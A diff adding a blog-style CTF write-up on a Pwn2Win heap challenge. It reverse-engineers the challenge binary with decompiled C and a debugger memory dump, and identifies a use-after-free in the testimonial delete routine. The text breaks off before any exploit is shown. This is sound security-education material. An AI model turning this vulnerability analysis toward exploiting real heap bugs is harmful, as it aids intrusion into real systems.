@@ -1,0 +1,646 @@
+I"�"<p>Yet another challenge which I spent my time on in this weekend’s Pwn2Win CTF.</p>
+
+<h2 id="tldr-of-the-challenge-binary">TL;DR of The Challenge Binary</h2>
+
+<p>We’ve been given Libc 2.23 along with the <code class="language-plaintext highlighter-rouge">x86 64-bit Dynamically Linked</code> executable.</p>
+
+<p>Let us start reversing without any further delay.</p>
+
+<h2 id="reversing">REVERSING</h2>
+
+<p>To begin with , we land in a small Menu Driven code which has two options , <em>sign_in</em> and <em>sign_up</em>.</p>
+
+<ul>
+  <li><em>sign_up</em>
+    <ol>
+      <li>We have a user limit of <strong>3</strong>.</li>
+      <li>The function takes 16 bytes of user input for <strong>Username</strong> and <strong>Password</strong> and checks if both username and Password are of length atleast <strong>4 bytes</strong>.</li>
+      <li>Then , it checks whether the <strong>username</strong> already exists and if not , it stores the username and password on bss.</li>
+    </ol>
+  </li>
+</ul>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">if</span> <span class="p">(</span> <span class="n">dword_20304C</span> <span class="o">&gt;</span> <span class="mi">3</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"The user list is full!"</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x10uLL</span><span class="p">);</span>
+    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x10uLL</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"-----------------------------------------"</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Username: "</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="mh">0x10uLL</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Password: "</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x10uLL</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">strlen</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">3</span> <span class="o">||</span> <span class="n">strlen</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">3</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"The username and password"</span><span class="p">);</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"must be at least 4 characters!"</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+      <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">dword_20304C</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+      <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">unk_203060</span> <span class="o">+</span> <span class="mi">200</span> <span class="o">*</span> <span class="n">i</span><span class="p">)</span> <span class="p">)</span>
+        <span class="p">{</span>
+          <span class="n">puts</span><span class="p">(</span><span class="s">"User already registered!"</span><span class="p">);</span>
+          <span class="k">return</span> <span class="mh">0xFFFFFFFFLL</span><span class="p">;</span>
+        <span class="p">}</span>
+      <span class="p">}</span>
+      <span class="n">v1</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">unk_203060</span> <span class="o">+</span> <span class="mi">200</span> <span class="o">*</span> <span class="n">dword_20304C</span><span class="p">);</span>
+      <span class="n">v2</span> <span class="o">=</span> <span class="n">v8</span><span class="p">;</span>
+      <span class="o">*</span><span class="n">v1</span> <span class="o">=</span> <span class="n">s</span><span class="p">;</span>
+      <span class="n">v1</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">v2</span><span class="p">;</span>
+      <span class="n">v3</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">unk_203060</span> <span class="o">+</span> <span class="mi">200</span> <span class="o">*</span> <span class="n">dword_20304C</span> <span class="o">+</span> <span class="mi">16</span><span class="p">);</span>
+      <span class="n">v4</span> <span class="o">=</span> <span class="n">v10</span><span class="p">;</span>
+      <span class="o">*</span><span class="n">v3</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
+      <span class="n">v3</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">v4</span><span class="p">;</span>
+      <span class="n">v5</span> <span class="o">=</span> <span class="n">dword_20304C</span><span class="o">++</span><span class="p">;</span>
+      <span class="n">dword_203080</span><span class="p">[</span><span class="mi">50</span> <span class="o">*</span> <span class="n">v5</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
+
+</code></pre></div></div>
+
+<ul>
+  <li><em>sign_in</em>
+    <ol>
+      <li>Asks for username and password , checks if the username already exists on the bss table or not.</li>
+      <li>If yes , then it takes us to another <em>Testimonial_Menu</em>.</li>
+    </ol>
+  </li>
+</ul>
+
+<p>Let us explore and see what the <em>testimonial_menu</em> has in store for us.</p>
+
+<ul>
+  <li><em>Write_Testimonial</em>
+    <ol>
+      <li>Takes in <em>user_name</em> , checks if it exists and then sets <em>user_idx</em> to the index of the user requested.</li>
+      <li>Checks if the number of testimonials present exceed <strong>9</strong>.</li>
+      <li>Else , It mallocs a chunk of size <strong>0x500</strong> , reads in 0x500 bytes.</li>
+      <li>Stores the malloc pointer onto the corresponding user_name section of bss.</li>
+      <li>It also increments the next 8 bytes of memory after storing the malloc pointer.</li>
+    </ol>
+  </li>
+</ul>
+
+<p class="notice">There’s one more thing to this , you can add testimonials only to the users apart from the one you are signed in from.</p>
+
+<p>For instance , I have added 8 testimonials and this is how bss section corresponding to the user_name specified looks like.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+0024| 0x555555757128 <span class="nt">--</span><span class="o">&gt;</span> 0xa646e6f636573 <span class="o">(</span><span class="s1">'second\n'</span><span class="o">)</span> The username that I gave to add was second.
+0032| 0x555555757130 <span class="nt">--</span><span class="o">&gt;</span> 0x0 
+0040| 0x555555757138 <span class="nt">--</span><span class="o">&gt;</span> 0xa646e6f636573 <span class="o">(</span><span class="s1">'second\n'</span><span class="o">)</span>
+0048| 0x555555757140 <span class="nt">--</span><span class="o">&gt;</span> 0x0 
+0056| 0x555555757148 <span class="nt">--</span><span class="o">&gt;</span> 0x8 
+0064| 0x555555757150 <span class="nt">--</span><span class="o">&gt;</span> 0x555555758010 <span class="nt">--</span><span class="o">&gt;</span> 0xa61616161 <span class="o">(</span><span class="s1">'aaaa\n'</span><span class="o">)</span>
+0072| 0x555555757158 <span class="nt">--</span><span class="o">&gt;</span> 0x1 
+0080| 0x555555757160 <span class="nt">--</span><span class="o">&gt;</span> 0x555555758520 <span class="nt">--</span><span class="o">&gt;</span> 0xa62626262 <span class="o">(</span><span class="s1">'bbbb\n'</span><span class="o">)</span>
+0088| 0x555555757168 <span class="nt">--</span><span class="o">&gt;</span> 0x1 
+0096| 0x555555757170 <span class="nt">--</span><span class="o">&gt;</span> 0x555555758a30 <span class="nt">--</span><span class="o">&gt;</span> 0xa63636363 <span class="o">(</span><span class="s1">'cccc\n'</span><span class="o">)</span>
+0104| 0x555555757178 <span class="nt">--</span><span class="o">&gt;</span> 0x1 
+0112| 0x555555757180 <span class="nt">--</span><span class="o">&gt;</span> 0x555555758f40 <span class="nt">--</span><span class="o">&gt;</span> 0xa64646464 <span class="o">(</span><span class="s1">'dddd\n'</span><span class="o">)</span>
+0120| 0x555555757188 <span class="nt">--</span><span class="o">&gt;</span> 0x1 
+0128| 0x555555757190 <span class="nt">--</span><span class="o">&gt;</span> 0x555555759450 <span class="nt">--</span><span class="o">&gt;</span> 0xa65656565 <span class="o">(</span><span class="s1">'eeee\n'</span><span class="o">)</span>
+0136| 0x555555757198 <span class="nt">--</span><span class="o">&gt;</span> 0x1 
+0144| 0x5555557571a0 <span class="nt">--</span><span class="o">&gt;</span> 0x555555759960 <span class="nt">--</span><span class="o">&gt;</span> 0xa66666666 <span class="o">(</span><span class="s1">'ffff\n'</span><span class="o">)</span>
+0152| 0x5555557571a8 <span class="nt">--</span><span class="o">&gt;</span> 0x1 
+0160| 0x5555557571b0 <span class="nt">--</span><span class="o">&gt;</span> 0x555555759e70 <span class="nt">--</span><span class="o">&gt;</span> 0xa67676767 <span class="o">(</span><span class="s1">'gggg\n'</span><span class="o">)</span>
+0168| 0x5555557571b8 <span class="nt">--</span><span class="o">&gt;</span> 0x1 
+0176| 0x5555557571c0 <span class="nt">--</span><span class="o">&gt;</span> 0x55555575a380 <span class="nt">--</span><span class="o">&gt;</span> 0xa68686868 <span class="o">(</span><span class="s1">'hhhh\n'</span><span class="o">)</span>
+0184| 0x5555557571c8 <span class="nt">--</span><span class="o">&gt;</span> 0x1 
+0192| 0x5555557571d0 <span class="nt">--</span><span class="o">&gt;</span> 0x0 
+0200| 0x5555557571d8 <span class="nt">--</span><span class="o">&gt;</span> 0x0 
+0208| 0x5555557571e0 <span class="nt">--</span><span class="o">&gt;</span> 0x0 
+0216| 0x5555557571e8 <span class="nt">--</span><span class="o">&gt;</span> 0x0 
+0224| 0x5555557571f0 <span class="nt">--</span><span class="o">&gt;</span> 0xa6472696874 <span class="o">(</span><span class="s1">'third\n'</span><span class="o">)</span>
+0232| 0x5555557571f8 <span class="nt">--</span><span class="o">&gt;</span> 0x0 
+0240| 0x555555757200 <span class="nt">--</span><span class="o">&gt;</span> 0xa6472696874 <span class="o">(</span><span class="s1">'third\n'</span><span class="o">)</span>
+
+</code></pre></div></div>
+<p>Here goes the decompilation.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">user_idx</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Recipient Username: "</span><span class="p">);</span>
+  <span class="n">v1</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">;</span>
+  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x10uLL</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">strlen</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">3</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">v1</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">unk_203060</span> <span class="o">+</span> <span class="mi">200</span> <span class="o">*</span> <span class="n">a1</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">strcmp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="n">v1</span><span class="p">)</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">dword_20304C</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+      <span class="p">{</span>
+        <span class="n">v1</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">unk_203060</span> <span class="o">+</span> <span class="mi">200</span> <span class="o">*</span> <span class="n">i</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="n">v1</span><span class="p">)</span> <span class="p">)</span>
+        <span class="p">{</span>
+          <span class="n">user_idx</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
+          <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">user_idx</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"User Not Found!"</span><span class="p">);</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="mh">0xFFFFFFFFLL</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="nf">if</span> <span class="p">(</span> <span class="n">dword_203080</span><span class="p">[</span><span class="mi">50</span> <span class="o">*</span> <span class="n">user_idx</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">9</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"The user cannot receive new testimonials"</span><span class="p">);</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="mh">0xFFFFFFFFLL</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Testimonial: "</span><span class="p">,</span> <span class="n">v1</span><span class="p">);</span>
+    <span class="n">v2</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x500uLL</span><span class="p">);</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">v2</span><span class="p">,</span> <span class="mh">0x500uLL</span><span class="p">);</span>
+    <span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">unk_203068</span> <span class="o">+</span> <span class="mi">25</span> <span class="o">*</span> <span class="n">user_idx</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="p">(</span><span class="n">dword_203080</span><span class="p">[</span><span class="mi">50</span> <span class="o">*</span> <span class="n">user_idx</span><span class="p">]</span> <span class="o">+</span> <span class="mi">2LL</span><span class="p">))</span> <span class="o">=</span> <span class="n">v2</span><span class="p">;</span>
+    <span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">unk_203074</span> <span class="o">+</span> <span class="mi">50</span> <span class="o">*</span> <span class="n">user_idx</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">*</span> <span class="p">(</span><span class="n">dword_203080</span><span class="p">[</span><span class="mi">50</span> <span class="o">*</span> <span class="n">user_idx</span><span class="p">]</span> <span class="o">+</span> <span class="mi">2LL</span><span class="p">))</span> <span class="o">=</span> <span class="n">a1</span><span class="p">;</span>
+    <span class="n">v3</span> <span class="o">=</span> <span class="n">dword_203080</span><span class="p">[</span><span class="mi">50</span> <span class="o">*</span> <span class="n">user_idx</span><span class="p">];</span>
+    <span class="n">dword_203080</span><span class="p">[</span><span class="mi">50</span> <span class="o">*</span> <span class="n">user_idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">v3</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">unk_203070</span> <span class="o">+</span> <span class="mi">50</span> <span class="o">*</span> <span class="n">user_idx</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">*</span> <span class="p">(</span><span class="n">v3</span> <span class="o">+</span> <span class="mi">2LL</span><span class="p">))</span> <span class="o">=</span> <span class="n">user_idx</span><span class="p">;</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+
+</code></pre></div></div>
+
+<ul>
+  <li><em>View_All</em> -&gt;
+    <ol>
+      <li>Views all the data of each chunk.</li>
+    </ol>
+  </li>
+  <li>Edit -&gt;
+    <ol>
+      <li>Prints each testimonial</li>
+      <li>Asks for editing a testimonial at a given idx.</li>
+      <li>Then reads in 0x500 bytes of data into the requested testimonial.</li>
+    </ol>
+  </li>
+</ul>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">3</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">for</span> <span class="p">(</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;=</span> <span class="mi">9</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="n">a1</span> <span class="o">==</span> <span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">unk_203074</span> <span class="o">+</span> <span class="mi">50</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">*</span> <span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="mi">2LL</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">unk_203068</span> <span class="o">+</span> <span class="mi">25</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="mi">2LL</span><span class="p">))</span> <span class="p">)</span>
+      <span class="p">{</span>
+        <span class="n">v1</span> <span class="o">=</span> <span class="n">v8</span><span class="o">++</span><span class="p">;</span>
+        <span class="n">v13</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">unk_203060</span> <span class="o">+</span> <span class="mi">200</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">16</span> <span class="o">*</span> <span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="mi">2LL</span><span class="p">)</span> <span class="o">+</span> <span class="mi">8</span><span class="p">;</span>
+        <span class="n">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">byte_21C9</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Testimonial %d: "</span><span class="p">,</span> <span class="n">v8</span><span class="p">);</span>
+        <span class="k">for</span> <span class="p">(</span> <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">k</span> <span class="o">&lt;=</span> <span class="mi">31</span><span class="p">;</span> <span class="o">++</span><span class="n">k</span> <span class="p">)</span>
+        <span class="p">{</span>
+          <span class="n">v2</span> <span class="o">=</span> <span class="p">(</span><span class="mi">40</span> <span class="o">*</span> <span class="n">k</span> <span class="o">+</span> <span class="o">*</span><span class="n">v13</span><span class="p">[</span><span class="n">v8</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]);</span>
+          <span class="n">v3</span> <span class="o">=</span> <span class="n">v2</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+          <span class="o">*</span><span class="n">s</span> <span class="o">=</span> <span class="o">*</span><span class="n">v2</span><span class="p">;</span>
+          <span class="n">v16</span> <span class="o">=</span> <span class="n">v3</span><span class="p">;</span>
+          <span class="n">v4</span> <span class="o">=</span> <span class="n">v2</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
+          <span class="n">v17</span> <span class="o">=</span> <span class="n">v2</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+          <span class="n">v18</span> <span class="o">=</span> <span class="n">v4</span><span class="p">;</span>
+          <span class="n">v19</span> <span class="o">=</span> <span class="n">v2</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
+          <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">s</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="p">)</span>
+            <span class="k">break</span><span class="p">;</span>
+          <span class="n">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">byte_21C9</span><span class="p">);</span>
+          <span class="n">v5</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+          <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">v5</span><span class="p">);</span>
+        <span class="p">}</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">v8</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"You haven't written a testimonial yet"</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Edit Testimonial (y/N): "</span><span class="p">);</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">buf</span> <span class="o">==</span> <span class="mi">89</span> <span class="o">||</span> <span class="n">buf</span> <span class="o">==</span> <span class="mi">121</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">"Testimonial Number: "</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
+      <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">);</span>
+      <span class="n">v12</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="n">v12</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">v12</span> <span class="o">&gt;</span> <span class="n">v8</span> <span class="p">)</span>
+      <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"Not found"</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="k">else</span>
+      <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"New Testimonial: "</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
+        <span class="n">memset</span><span class="p">(</span><span class="n">v20</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x500uLL</span><span class="p">);</span>
+        <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">v20</span><span class="p">,</span> <span class="mh">0x500uLL</span><span class="p">);</span>
+        <span class="n">v6</span> <span class="o">=</span> <span class="o">*</span><span class="n">v13</span><span class="p">[</span><span class="n">v12</span> <span class="o">-</span> <span class="mi">1</span><span class="p">];</span>
+        <span class="o">*</span><span class="n">v6</span> <span class="o">=</span> <span class="o">*</span><span class="n">v20</span><span class="p">;</span>
+        <span class="n">v6</span><span class="p">[</span><span class="mi">159</span><span class="p">]</span> <span class="o">=</span> <span class="n">v21</span><span class="p">;</span>
+        <span class="n">qmemcpy</span><span class="p">(</span>
+          <span class="p">((</span><span class="n">v6</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFFFFFFFF8LL</span><span class="p">),</span>
+          <span class="p">(</span><span class="n">v20</span> <span class="o">-</span> <span class="p">(</span><span class="n">v6</span> <span class="o">-</span> <span class="p">((</span><span class="n">v6</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFFFFFFFF8LL</span><span class="p">))),</span>
+          <span class="mi">8LL</span> <span class="o">*</span> <span class="p">(((</span><span class="n">v6</span> <span class="o">-</span> <span class="p">((</span><span class="n">v6</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFF8</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1280</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFF8</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">));</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+</code></pre></div></div>
+
+<ul>
+  <li><em>Delete</em> -&gt;
+    <ol>
+      <li>Frees the chunk at requested idx without nulling out the pointer , hence we have <strong>Use After Free</strong>.</li>
+      <li>After freeing , it shifts all the testimonials and overwrites the data of the freed chunk.</li>
+    </ol>
+  </li>
+</ul>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">if</span> <span class="p">(</span> <span class="n">dword_203080</span><span class="p">[</span><span class="mi">50</span> <span class="o">*</span> <span class="n">a1</span><span class="p">]</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Testimonial Number: "</span><span class="p">);</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">);</span>
+    <span class="n">v8</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">v8</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">v8</span> <span class="o">&gt;</span> <span class="n">dword_203080</span><span class="p">[</span><span class="mi">50</span> <span class="o">*</span> <span class="n">a1</span><span class="p">]</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"Not found"</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">v8</span> <span class="o">==</span> <span class="n">dword_203080</span><span class="p">[</span><span class="mi">50</span> <span class="o">*</span> <span class="n">a1</span><span class="p">]</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">free</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">unk_203068</span> <span class="o">+</span> <span class="mi">25</span> <span class="o">*</span> <span class="n">a1</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="p">(</span><span class="o">--</span><span class="n">dword_203080</span><span class="p">[</span><span class="mi">50</span> <span class="o">*</span> <span class="n">a1</span><span class="p">]</span> <span class="o">+</span> <span class="mi">2LL</span><span class="p">)));</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+      <span class="n">v1</span> <span class="o">=</span> <span class="mi">16</span> <span class="o">*</span> <span class="p">(</span><span class="n">v8</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">+</span> <span class="mi">2LL</span><span class="p">)</span> <span class="o">+</span> <span class="mi">200LL</span> <span class="o">*</span> <span class="n">a1</span><span class="p">;</span>
+      <span class="n">v9</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">unk_203060</span> <span class="o">+</span> <span class="n">v1</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>
+      <span class="n">v10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">unk_203060</span> <span class="o">+</span> <span class="n">v1</span> <span class="o">+</span> <span class="mi">16</span><span class="p">);</span>
+      <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="n">v8</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="n">dword_203080</span><span class="p">[</span><span class="mi">50</span> <span class="o">*</span> <span class="n">a1</span><span class="p">];</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+      <span class="p">{</span>
+        <span class="n">v2</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">unk_203060</span> <span class="o">+</span> <span class="mi">200</span> <span class="o">*</span> <span class="n">a1</span> <span class="o">+</span> <span class="mi">16</span> <span class="o">*</span> <span class="p">(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">+</span> <span class="mi">2LL</span><span class="p">);</span>
+        <span class="n">v3</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">unk_203060</span> <span class="o">+</span> <span class="mi">200</span> <span class="o">*</span> <span class="n">a1</span> <span class="o">+</span> <span class="mi">16</span> <span class="o">*</span> <span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">2LL</span><span class="p">);</span>
+        <span class="n">v4</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">v3</span> <span class="o">+</span> <span class="mi">2</span><span class="p">);</span>
